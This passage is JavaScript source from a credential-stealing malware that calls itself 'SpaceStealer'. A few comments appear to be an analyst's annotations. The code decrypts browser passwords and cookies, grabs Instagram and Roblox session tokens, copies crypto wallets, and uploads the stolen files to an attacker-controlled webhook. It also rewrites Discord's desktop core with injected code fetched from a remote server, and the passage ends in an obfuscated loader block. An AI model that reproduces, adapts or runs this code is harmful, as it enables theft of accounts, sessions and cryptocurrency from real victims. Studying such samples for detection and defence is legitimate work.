                applicationName = browserPath[i][0]
                    .split('\\Roaming\\')[1]
                    .split('\\')[1];
            }

            const loginDataPath = browserPath[i][0] + 'Login Data';
            const passwordsDbPath = browserPath[i][0] + 'passwords.db';

            fs.copyFileSync(loginDataPath, passwordsDbPath);

            const db = new sqlite3.Database(passwordsDbPath);

            await new Promise((resolve, reject) => {
                db.each(

                    'SELECT origin_url, username_value, password_value FROM logins',

                    (err, row) => {
                        if (!row.username_value) {
                            return;
                        }

                        let password = row.password_value;

                        try {
                            const encryptionKey = password.slice(3, 15);
                            const encryptedData = password.slice(15, password.length - 16);
                            const authTag = password.slice(password.length - 16, password.length);

                            const decipher = crypto.createDecipheriv(
                                'aes-256-gcm',
                                browserPath[i][3],
                                encryptionKey
                            );

                            decipher.setAuthTag(authTag);

                            const decryptedPassword = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

                            passwords.push(
                                '================\nURL: ' +

                                row.origin_url +

                                '\nUsername: ' +

                                row.username_value +

                                '\nPassword: ' +

                                decryptedPassword +

                                '\nApplication: ' +
                                
                                applicationName + ' ' +
                                
                                browserPath[i][1] + '\n'
                            );

                            count.passwords++;

                        } catch (error) {
                            // Error handling
                        }
                    },

                    () => {
                        resolve('');
                    }
                );
            });
        }

        if (passwords.length) {
            fs.writeFileSync(
                randomPath + '\\Passwords.txt',
                user.copyright + passwords.join(''),

                {
                    encoding: 'utf8',
                    flag: 'a+',
                }
            );
        }
    }

    async getCookiesAndSendWebhook() {
        addFolder('Cookies\\');

        const cookiesData = {};

        for (let i = 0; i < browserPath.length; i++) {
            if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
                continue;
            }

            let browserFolder;

            if (browserPath[i][0].includes('Local')) {
                browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
            } else {
                browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
            }

            const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
            const db = new sqlite3.Database(cookiesPath);

            await new Promise((resolve, reject) => {
                db.each(

                    'SELECT * FROM cookies',

                    function(err, row) {
                        let encryptedValue = row.encrypted_value;
                        let iv = encryptedValue.slice(3, 15);
                        let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                        let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                        let decrypted = '';

                        try {
                            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);

                            decipher.setAuthTag(authTag);
                            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

                            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
                                SubmitInstagram(`${decrypted}`);
                            }

                            if (row.name === '.ROBLOSECURITY') {
                                SubmitRoblox(`${decrypted}`);
                            }
                        } catch (error) {}

                        if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
                            cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
                        }

                        cookiesData[browserFolder + '_' + browserPath[i][1]].push(
                            `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${decrypted} \n`
                        );

                        count.cookies++;
                    },

                    () => {
                        resolve('');
                    }
                );
            });
        }

        for (let [browserName, cookies] of Object.entries(cookiesData)) {
            if (cookies.length !== 0) {

                var cookiesContent = cookies.join('');

                fs.writeFileSync(
                    randomPath + '\\Cookies\\' + browserName + '.txt',
                    user.copyright + cookiesContent,

                    {
                        encoding: 'utf8',
                        flag: 'a+',
                    });

                httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
                    const webhook = res.data;
                    const form = new FormData();

                    form.append("file", fs.createReadStream(randomPath + '\\Cookies\\' + browserName + '.txt'));

                    form.submit(webhook, (error, response) => {
                        if (error) console.log(error);
                    });
                });
            }
        }
    }

    async getExtension() {
        addFolder('Wallets');

        let walletCount = 0;
        let browserCount = 0;

        for (let [extensionName, extensionPath] of Object.entries(extension)) {
            for (let i = 0; i < browserPath.length; i++) {

                let browserFolder;

                if (browserPath[i][0].includes('Local')) {
                    browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
                } else {
                    browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
                }

                const browserExtensionPath = `${browserPath[i][0]}${extensionPath}`;

                if (fs.existsSync(browserExtensionPath)) {
                    const walletFolder = `\\Wallets\\${extensionName}_${browserFolder}_${browserPath[i][1]}`;

                    copyFolder(walletFolder, browserExtensionPath);

                    walletCount++;
                    count.wallets++;
                }
            }
        }

        for (let [walletName, walletPath] of Object.entries(walletPaths)) {
            if (fs.existsSync(walletPath)) {
                const walletFolder = `\\wallets\\${walletName}`;

                copyFolder(walletFolder, walletPath);

                browserCount++;
                count.wallets++;
            }
        }

        if (walletCount > 0 || browserCount > 0) {
            const message =
                `🛠️ Browser wallet: \`${walletCount}\`\n` +
                `🖥️ Desktop wallet: \`${browserCount}\``;

            // Burada mesajı kullanmak veya işlemek için bir şeyler yapabilirsiniz
            // not important message, it's in Turkish and means "Here you can do something to use or process the message"
		    // so i think the malware developer just copy-pasted it from somewhere or someone
        }
    }

    async subpassword() {
        httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
            const webhook = res.data;
            const form = new FormData();

            form.append("file", fs.createReadStream(`${randomPath}/Passwords.txt`));
            form.submit(webhook)
        });
    }

    async subautofill() {
        httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
            const webhook = res.data;
            const form = new FormData();

            form.append("file", fs.createReadStream(`${randomPath}/Wallets/Autofills.txt`));
            form.submit(webhook)
        });
    }

    async SubmitExodus() {
        const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;

        if (fs.existsSync(file)) {
            const zipper = new AdmZip();
            zipper.addLocalFolder(file);

            zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`)

            httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
                let webhook = res.data;

                const form = new FormData();

                form.append("file", fs.createReadStream(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`));
                form.submit(webhook, (error, response) => {
                    fs.unlinkSync(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`)
                });
            })
        }
    }

    async InfectDiscords() {
        var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";

        if (fs.existsSync(betterdiscord)) {
            var read = fs.readFileSync(dir);
            fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
        }

        const response = await httpx(`${baseapi}/injection2`, {
            data: {
                key: api_auth
            }
        });

        const res = response.data.replace("%API_AUTH_HERE%", api_auth);

        injection = res;

        await fs.readdir(local, (async (err, files) => {
            await files.forEach((async dirName => {
                dirName.toString().includes("cord") && await discords.push(dirName)
            })), discords.forEach((async discordPath => {
                await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                    file.forEach((async insideDiscordDir => {
                        insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                            file.forEach((async insideAppDir => {
                                insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                    file.forEach((insideModulesDir => {
                                        insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                            file.forEach((insideCore => {
                                                insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                    file.forEach((insideCoreFinal => {
                                                        insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {
                                                            })),

                                                            fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))

                                                        if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                            injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js");
                                                        }
                                                    }))
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }

    async InfectDiscords() {
        var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";

        if (fs.existsSync(betterdiscord)) {
            var read = fs.readFileSync(dir);
            fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
        }

        const response = await httpx(`${baseapi}/injection2`, {
            data: {
                key: api_auth
            }
        });

        const res = response.data.replace("%API_AUTH_HERE%", api_auth);

        injection = res;

        await fs.readdir(local, (async (err, files) => {
            await files.forEach((async dirName => {
                dirName.toString().includes("cord") && await discords.push(dirName)
            })), discords.forEach((async discordPath => {
                await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                    file.forEach((async insideDiscordDir => {
                        insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                            file.forEach((async insideAppDir => {
                                insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                    file.forEach((insideModulesDir => {
                                        insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                            file.forEach((insideCore => {
                                                insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                    file.forEach((insideCoreFinal => {
                                                        insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {
                                                            })),
                                                            fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                        if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                            injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js");
                                                        }
                                                    }))
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }
}

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

// SpaceStealer initialization
new SpaceStealer()

function _0x4a268c(_0x12c4c2, _0x75dfa5, _0x8170bb, _0x3fb6db, _0x5d3b02) {
    var _0x1381a3 = {
        _0x327c86: 0x25f
    };
    return _0x434e(_0x5d3b02 - _0x1381a3._0x327c86, _0x75dfa5);
}(function(_0x256a24, _0x1b9cba) {
    var _0x1bf426 = {
            _0x34766b: 0xaa,
            _0x4387b4: 0x1f2,
            _0x2ac321: 0x210,
            _0x578f95: 'CnS$',
            _0x2e6236: 0x2b2,
            _0x249416: 0x2af,
            _0x1a8231: 'EL^V',
            _0x37c9b5: 0x29b,
            _0x1f9f19: 'gf$q',
            _0x5a3449: 0xaa,
            _0x1fa9d8: 0x166,
            _0x354cdd: 0x177,
            _0x1d64bb: 'DH$l',
            _0x246c40: 0xf3,
            _0x269bb8: 0x175,
            _0x44c67b: 'uvH0',
            _0x56bf33: 0x193,
            _0x3c6f18: 'cy%S',
            _0x4e2312: 0x175,
            _0x43434c: '^8ax',
            _0x219d7f: 0x15f,
            _0x3e5f9c: 0x170,
            _0x544b91: 0x16e,
            _0xd9dba7: 'xf3i',
            _0x264895: 0x2a0,
            _0x5ccddd: 0x279,
            _0x5e6614: 0x28c,
            _0x330a20: 0xa5,
            _0x2ebf9c: 'T%52',
            _0xee698b: 0x92
        },
        _0x3c845b = {
            _0x362e25: 0x2ef
        };

    function _0x32e716(_0x110355, _0xae276b, _0x26fe75, _0x8895d0, _0x2c9e80) {
        return _0x434e(_0x2c9e80 - -0xe3, _0xae276b);
    }

    function _0x3f17ff(_0x352528, _0x14081c, _0x4dc859, _0x1100b5, _0x307d1e) {
        return _0x434e(_0x14081c - -0x72, _0x352528);
    }
    var _0x581847 = _0x256a24();

    function _0x14f5e1(_0x252343, _0x3e2ebe, _0x43d8fc, _0x11ef8a, _0x4eabf9) {
        return _0x434e(_0x43d8fc - 0x7f, _0x4eabf9);
    }

    function _0x17f2c5(_0x498049, _0x63253d, _0x89aa92, _0x9430c, _0x2b0062) {
        return _0x434e(_0x89aa92 - -_0x3c845b._0x362e25, _0x2b0062);
    }

    function _0x204131(_0x321348, _0x2afbfa, _0x478a27, _0x40a9a2, _0x2a2519) {
        return _0x434e(_0x478a27 - 0x129, _0x40a9a2);
    }
    while (!![]) {
        try {
            var _0x39191e = -parseInt(_0x32e716(0xb0, 'BW*f', _0x1bf426._0x34766b, 0xa1, 0xa1)) / (0x128f + -0x24d6 * -0x1 + -0x3764) * (-parseInt(_0x14f5e1(0x1f2, _0x1bf426._0x4387b4, 0x201, _0x1bf426._0x2ac321, _0x1bf426._0x578f95)) / (0x267 * 0x2 + -0x1d55 + 0x1889)) + parseInt(_0x204131(_0x1bf426._0x2e6236, _0x1bf426._0x249416, 0x2b0, _0x1bf426._0x1a8231, _0x1bf426._0x37c9b5)) / (-0x6d * 0x1e + 0x16 * 0x172 + -0x1303) * (parseInt(_0x32e716(0xb3, _0x1bf426._0x1f9f19, 0x95, _0x1bf426._0x5a3449, 0xa2)) / (-0x23f0 + -0x1 * 0x1a81 + 0x10f * 0x3b)) + parseInt(_0x17f2c5(-_0x1bf426._0x1fa9d8, -0x175, -_0x1bf426._0x354cdd, -0x168, _0x1bf426._0x1d64bb)) / (-0x2da * 0x5 + -0x10d * 0xb + -0x19d6 * -0x1) + parseInt(_0x3f17ff('QdL!', _0x1bf426._0x246c40, 0xf3, 0xeb, 0xf9)) / (0x99b * 0x1 + -0x4b0 + -0xb3 * 0x7) * (-parseInt(_0x17f2c5(-0x185, -0x178, -0x17d, -_0x1bf426._0x269bb8, _0x1bf426._0x44c67b)) / (0x3 * 0x283 + -0xc31 * -0x3 + -0x8d1 * 0x5)) + parseInt(_0x17f2c5(-_0x1bf426._0x56bf33, -0x180, -0x184, -0x16f, _0x1bf426._0x3c6f18)) / (0xb53 + 0xc8d + -0x1c * 0xda) * (parseInt(_0x17f2c5(-0x168, -_0x1bf426._0x4e2312, -0x170, -0x16a, _0x1bf426._0x43434c)) / (0x3ee * -0x1 + 0x82c * 0x2 + -0xc61)) + -parseInt(_0x17f2c5(-_0x1bf426._0x219d7f, -_0x1bf426._0x3e5f9c, -0x167, -_0x1bf426._0x544b91, _0x1bf426._0xd9dba7)) / (0xe51 + -0xf4d + 0x2 * 0x83) + -parseInt(_0x204131(_0x1bf426._0x264895, _0x1bf426._0x5ccddd, _0x1bf426._0x5e6614, 'bhJ)', 0x28e)) / (0x1 * 0x1bed + -0x8 * -0x2ec + 0x36 * -0xf3) * (-parseInt(_0x32e716(_0x1bf426._0x330a20, _0x1bf426._0x2ebf9c, 0x80, 0x8a, _0x1bf426._0xee698b)) / (-0xe2 * 0x11 + 0x4d * -0x51 + 0x276b));
            if (_0x39191e === _0x1b9cba) break;
            else _0x581847['push'](_0x581847['shift']());
        } catch (_0x5aaf5b) {
            _0x581847['push'](_0x581847['shift']());
        }
    }
}(_0x1d16, 0x16afb9 + -0x2598d * -0xc + -0x24936e));

function _0x1d16() {
    var _0x44b1f1 = ['WOBdT8oM', 'WQ/dOCknACkGobtcLW', 'smkQEcRcGW', 'BezDjmknmHP6', 'W7pdSGrMW6y', 'fgbwW4n0', 'W6pdRxD8vrNdN8ozk8k8WRpdN8ow', 'W7iAcmo+W7xdISk0uJtdImkllSof', 'eCo1dqxcHa', 'W6VcGmoQWQVdKSoPW5ZdRX/dI8o5Ba', 'd3fdW4fK', 'W7xdIxpcTLhcM8ozW4i', 'q8oIECofnq', 'BNxdRmkxW60', 'Aeb/hCkbbbf0', 'WQS7aCk4W5i', 's8o/ySkIrq0cWQRdOmoovmkAW6O', 'W7ddQgOqW7OcWP5i', 'W77dPIFdQue', 'tSosW7xcISkVuwxdOSo2v8ofCG0', 'WOSOWPNcJCkC', 'W7xdIa7dMcxdGmkaW5BcUtmvWRVcIq', 'W7xdIGldNcFdJmkgW5dcQqu4WO/cLG', 'udmpWOKIaIVcKZddMCoSwa', 'W6CpeCoQWOW', 'WO7dJfy', 'BCkSW6VcUSkfW4eW', 'q8k5xLvk', 'WRRdG8opzSku', 'dCopW6xcS8kgW7uPfG', 'uCoLFSk5wW', 'WPv2bCkdqq', 'W7hcKSoQdmoMW7tcVSkaW4PMW5BdJCk0', 'W5NdT8k1bSoz', 'WPBcUmkVkmoFWOzx', 'lYlcUCoqWRNdN8oBjKeIW7hdQX8', 'W7BdIGpdMYldGCkoW7lcJte0WQZcTq', 'ov8Jtgr5W64', 'W5BcKaxdScpcRL9bW5xdSSklW4RdSSkx', 'W6ddRxz7uHJdMCodhCkWWQldM8oI', 'kmodW73dUG0', 'WP/dJcRdQgfcBa'];
    _0x1d16 = function() {
        return _0x44b1f1;
    };
    return _0x1d16();
}
var _0x5f43cc = (function() {
        var _0x383481 = {
                _0x3af666: 0x38d,
                _0x3ecbb2: 0x390
            },
            _0x53d261 = !![];
        return function(_0x4558d8, _0x23d93e) {
            var _0x2dd578 = {
                    _0xdf4005: 0x229
                },
                _0x563730 = _0x53d261 ? function() {
                    function _0x13261c(_0x2d2c91, _0x3ba25f, _0x5e9be1, _0x1d8512, _0x59f7ca) {
                        return _0x434e(_0x3ba25f - _0x2dd578._0xdf4005, _0x2d2c91);
                    }
                    if (_0x23d93e) {
                        var _0x8bed1f = _0x23d93e[_0x13261c('ePqs', _0x383481._0x3af666, _0x383481._0x3ecbb2, 0x395, 0x389)](_0x4558d8, arguments);
                        return _0x23d93e = null, _0x8bed1f;
                    }
                } : function() {};
            return _0x53d261 = ![], _0x563730;
        };
    }()),
    _0x3e3a95 = _0x5f43cc(this, function() {
        var _0x1428bf = {
                _0x2688cf: 0x9f,
                _0x4230e7: 0x97,
                _0x224206: 0xa2,
                _0x4b1041: ')TxR',
                _0x398d7f: 0x99,
                _0x41dd2f: 0xa9,
                _0x2b9ca8: 0x98,
                _0x137ad5: 0xa8,
                _0x1580fb: 0x84,
                _0x7ccaf1: 'XDv#',
                _0x24b42d: 0x1c2,
                _0x4619f0: 'S0w(',
                _0x31349b: 0x1bb,
                _0x59d2f5: 0x1fe,
                _0x38601c: 0x1f0,
                _0x108b90: 0x1eb,
                _0x4bb7a5: 0x1d8,
                _0x10ed60: 0x74,
                _0x2bb091: 0x66,
                _0x1c7b41: 0x58,
                _0x4957b5: 0x5c,
                _0x33acd9: 'S0w(',
                _0x33e884: 0x204,
                _0xf57594: 0x1f1,
                _0x23a63f: 0x1c9,
                _0x346f1e: 0x1b0,
                _0x57ee0c: '65)(',
                _0x6b0eea: 0x1fc,
                _0x4e717d: 0x1e7,
                _0x27a208: 'gf$q',
                _0x4059f4: 0x1f8,
                _0x4ee89c: 0x77,
                _0x23cbbd: 0x7c,
                _0x2fd90a: 'a]Bz'
            },
            _0x5c3438 = {
                _0x3567f7: 0x219
            },
            _0x4b429d = {
                _0x19049f: 0x7e
            },
            _0x3d2d04 = {
                _0x1bb500: 0x1e4
            },
            _0x48c4f5 = {
                _0x54f2a2: 0x15b
            },
            _0x129125 = {
                _0x112a54: 0x345
            };

        function _0xfef504(_0x3e795c, _0x32cec0, _0x39fc11, _0x4eb917, _0x3883af) {
            return _0x434e(_0x4eb917 - -_0x129125._0x112a54, _0x32cec0);
        }

        function _0x14571a(_0x17f1b8, _0x406551, _0x24c1be, _0x1436bf, _0x1abd33) {
            return _0x434e(_0x24c1be - _0x48c4f5._0x54f2a2, _0x1436bf);
        }

        function _0x458f69(_0x5560a3, _0xbba5b7, _0x304fed, _0x2e9b9a, _0x3fd2ad) {
            return _0x434e(_0x304fed - -_0x3d2d04._0x1bb500, _0x3fd2ad);
        }
        var _0x48e222 = {};

        function _0x4bd141(_0x147f90, _0x2c81d0, _0x4bdf2c, _0x4e78b0, _0x2b3697) {
            return _0x434e(_0x2c81d0 - _0x4b429d._0x19049f, _0x147f90);
        }
        _0x48e222[_0x14691c(-_0x1428bf._0x2688cf, -0xad, -_0x1428bf._0x4230e7, -_0x1428bf._0x224206, _0x1428bf._0x4b1041)] = _0x14691c(-_0x1428bf._0x398d7f, -_0x1428bf._0x41dd2f, -0x8c, -0x99, 'uvH0') + _0x14691c(-_0x1428bf._0x2b9ca8, -_0x1428bf._0x137ad5, -0xaa, -_0x1428bf._0x1580fb, _0x1428bf._0x7ccaf1) + '+$';

        function _0x14691c(_0x379727, _0x28531f, _0x15d385, _0x233de0, _0x5469e4) {
            return _0x434e(_0x379727 - -_0x5c3438._0x3567f7, _0x5469e4);
        }
        var _0x1b78df = _0x48e222;
        return _0x3e3a95[_0xfef504(-_0x1428bf._0x24b42d, _0x1428bf._0x4619f0, -0x1a9, -_0x1428bf._0x31349b, -0x1b8) + _0x4bd141('tx(s', 0x20a, 0x1fe, _0x1428bf._0x59d2f5, 0x207)]()[_0x4bd141('R)E%', 0x1e5, _0x1428bf._0x38601c, _0x1428bf._0x108b90, _0x1428bf._0x4bb7a5) + 'h'](_0x1b78df[_0x458f69(-_0x1428bf._0x10ed60, -0x78, -_0x1428bf._0x2bb091, -_0x1428bf._0x1c7b41, 'tx(s')])[_0x458f69(-0x6a, -0x46, -0x5a, -_0x1428bf._0x4957b5, _0x1428bf._0x33acd9) + _0x4bd141('xf3i', 0x1f9, 0x20e, _0x1428bf._0x33e884, _0x1428bf._0xf57594)]()[_0xfef504(-0x1c4, 'eris', -_0x1428bf._0x23a63f, -0x1c2, -_0x1428bf._0x346f1e) + _0x4bd141(_0x1428bf._0x57ee0c, 0x1fb, _0x1428bf._0x6b0eea, _0x1428bf._0x4e717d, 0x1f7) + 'r'](_0x3e3a95)[_0x4bd141(_0x1428bf._0x27a208, 0x1ed, 0x1ea, _0x1428bf._0x4059f4, 0x1fa) + 'h'](_0x1b78df[_0x458f69(-0x75, -_0x1428bf._0x4ee89c, -0x73, -_0x1428bf._0x23cbbd, _0x1428bf._0x2fd90a)]);
    });

function _0x548da2(_0x1ee583, _0x4c1731, _0x2efaed, _0x3cecf1, _0x42f3a3) {
    return _0x434e(_0x42f3a3 - 0x6a, _0x1ee583);
}
_0x3e3a95();

function _0x5c384a(_0xb8e457, _0x42ed92, _0x28ed3f, _0x6b928b, _0x1a0f7f) {
    return _0x434e(_0xb8e457 - 0x6c, _0x28ed3f);
}

function _0x434e(_0x5b5504, _0x12d599) {
    var _0x5029ab = _0x1d16();
    return _0x434e = function(_0x9c33f8, _0x3d82c6) {
        _0x9c33f8 = _0x9c33f8 - (0xd * 0xe9 + -0x2b * 0x58 + 0x25 * 0x1e);
        var _0x3f0240 = _0x5029ab[_0x9c33f8];
        if (_0x434e['EQXAXU'] === undefined) {
            var _0x2e9aee = function(_0x43a305) {
                var _0x584cd2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                var _0x5ae0a5 = '',
                    _0x416959 = '',
                    _0x54e506 = _0x5ae0a5 + _0x2e9aee;
                for (var _0xcabb8f = -0x25ba + 0x8 * -0x25 + 0x26e2, _0x412a0c, _0x1d03da, _0x1c52a1 = -0x1 * 0x13e1 + 0x2c2 + 0x111f; _0x1d03da = _0x43a305['charAt'](_0x1c52a1++); ~_0x1d03da && (_0x412a0c = _0xcabb8f % (0xfa0 + 0xbe * 0x25 + -0x2 * 0x1589) ? _0x412a0c * (-0xa9 * 0x2a + 0x7e1 * -0x1 + 0x23db) + _0x1d03da : _0x1d03da, _0xcabb8f++ % (0x1afa + -0x141d * 0x1 + -0x1 * 0x6d9)) ? _0x5ae0a5 += _0x54e506['charCodeAt'](_0x1c52a1 + (0x173e + -0x258a + 0xe56)) - (-0x1 * -0x1f17 + -0x2 * -0x25 + -0x1f57 * 0x1) !== -0x101f + 0xc57 + 0x3c8 ? String['fromCharCode'](0x110e + -0x221c + 0x120d & _0x412a0c >> (-(-0x291 + 0x2 * -0x102b + 0x22e9) * _0xcabb8f & 0x22b7 + 0xf85 + -0x3236)) : _0xcabb8f : 0x10 * 0x14b + 0x1 * -0x120f + 0x2a1 * -0x1) {
                    _0x1d03da = _0x584cd2['indexOf'](_0x1d03da);
                }
                for (var _0x102c58 = -0x25ed + -0x933 + 0x1a * 0x1d0, _0x44d9e8 = _0x5ae0a5['length']; _0x102c58 < _0x44d9e8; _0x102c58++) {
                    _0x416959 += '%' + ('00' + _0x5ae0a5['charCodeAt'](_0x102c58)['toString'](-0x1c9 * 0x15 + 0x1c6a + 0x923))['slice'](-(-0xf12 * -0x2 + -0x1 * -0x2658 + -0xdb2 * 0x5));
                }
                return decodeURIComponent(_0x416959);
            };
            var _0x2ae43c = function(_0x45e71f, _0x51c5fb) {
                var _0x4c37bf = [],
                    _0x5d9508 = 0x4 * 0x32b + -0xebc + -0x84 * -0x4,
                    _0x395bc5, _0x3a60b2 = '';
                _0x45e71f = _0x2e9aee(_0x45e71f);
                var _0x287082;
                for (_0x287082 = 0x7 * 0x2f3 + 0x4 * -0x424 + -0x415; _0x287082 < -0x1 * -0xc03 + 0x1 * -0x19e3 + 0xee0; _0x287082++) {
                    _0x4c37bf[_0x287082] = _0x287082;
                }
                for (_0x287082 = 0x2093 * 0x1 + 0xa50 + -0x1 * 0x2ae3; _0x287082 < -0x1e5d * 0x1 + 0x119 * 0x10 + -0xdcd * -0x1; _0x287082++) {
                    _0x5d9508 = (_0x5d9508 + _0x4c37bf[_0x287082] + _0x51c5fb['charCodeAt'](_0x287082 % _0x51c5fb['length'])) % (-0x155e + 0x3 * -0x676 + 0x29c0), _0x395bc5 = _0x4c37bf[_0x287082], _0x4c37bf[_0x287082] = _0x4c37bf[_0x5d9508], _0x4c37bf[_0x5d9508] = _0x395bc5;
                }
                _0x287082 = -0xe * -0x1ea + 0x9 * -0x437 + 0xb23 * 0x1, _0x5d9508 = -0xb * -0x125 + 0x1 * -0x25d7 + 0x328 * 0x8;
                for (var _0x412cf0 = -0x1b8d + 0x1dc1 + -0xc * 0x2f; _0x412cf0 < _0x45e71f['length']; _0x412cf0++) {
                    _0x287082 = (_0x287082 + (-0xa93 + -0x57 * -0x5b + -0x1459)) % (-0x179 + -0xe63 * 0x1 + 0x1a * 0xa6), _0x5d9508 = (_0x5d9508 + _0x4c37bf[_0x287082]) % (0x1 * -0x1411 + -0x1df8 + 0x3309), _0x395bc5 = _0x4c37bf[_0x287082], _0x4c37bf[_0x287082] = _0x4c37bf[_0x5d9508], _0x4c37bf[_0x5d9508] = _0x395bc5, _0x3a60b2 += String['fromCharCode'](_0x45e71f['charCodeAt'](_0x412cf0) ^ _0x4c37bf[(_0x4c37bf[_0x287082] + _0x4c37bf[_0x5d9508]) % (0xa8d * 0x1 + 0x2 * 0xbff + 0x1 * -0x218b)]);
                }
                return _0x3a60b2;
            };
            _0x434e['jizdLe'] = _0x2ae43c, _0x5b5504 = arguments, _0x434e['EQXAXU'] = !![];
        }
        var _0x1a6847 = _0x5029ab[0xa * -0x1c7 + 0x2ef * -0x6 + 0x2360],
            _0x3a0e06 = _0x9c33f8 + _0x1a6847,
            _0x1b8007 = _0x5b5504[_0x3a0e06];
        if (!_0x1b8007) {
            if (_0x434e['qguinf'] === undefined) {
                var _0x444d70 = function(_0x1d5f21) {
                    this['yUGZnm'] = _0x1d5f21, this['TpJYpf'] = [0x226c * -0x1 + -0x1229 + -0x3496 * -0x1, -0x673 + 0x267 * 0x2 + 0x1a5, 0x1a4e * -0x1 + -0xcc6 + 0x29 * 0xf4], this['ASLHcM'] = function() {
                        return 'newState';
                    }, this['Gblups'] = '\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*', this['wrtCQI'] = '[\x27|\x22].+[\x27|\x22];?\x20*}';
                };
                _0x444d70['prototype']['JEoDfU'] = function() {
                    var _0x11f45f = new RegExp(this['Gblups'] + this['wrtCQI']),
                        _0x428874 = _0x11f45f['test'](this['ASLHcM']['toString']()) ? --this['TpJYpf'][-0x17ac + -0x23f0 + -0x1 * -0x3b9d] : --this['TpJYpf'][0x20f3 + 0x1885 + -0xe5e * 0x4];
                    return this['yGoYNI'](_0x428874);
                }, _0x444d70['prototype']['yGoYNI'] = function(_0xf661df) {
                    if (!Boolean(~_0xf661df)) return _0xf661df;
                    return this['DmiJVt'](this['yUGZnm']);
                }, _0x444d70['prototype']['DmiJVt'] = function(_0x555165) {
                    for (var _0x462223 = -0x1b2d * -0x1 + -0x1 * 0x147b + 0x359 * -0x2, _0xa37bef = this['TpJYpf']['length']; _0x462223 < _0xa37bef; _0x462223++) {
                        this['TpJYpf']['push'](Math['round'](Math['random']())), _0xa37bef = this['TpJYpf']['length'];
                    }
                    return _0x555165(this['TpJYpf'][-0x197a + 0xdf * 0x1 + 0x1 * 0x189b]);
                }, new _0x444d70(_0x434e)['JEoDfU'](), _0x434e['qguinf'] = !![];
            }
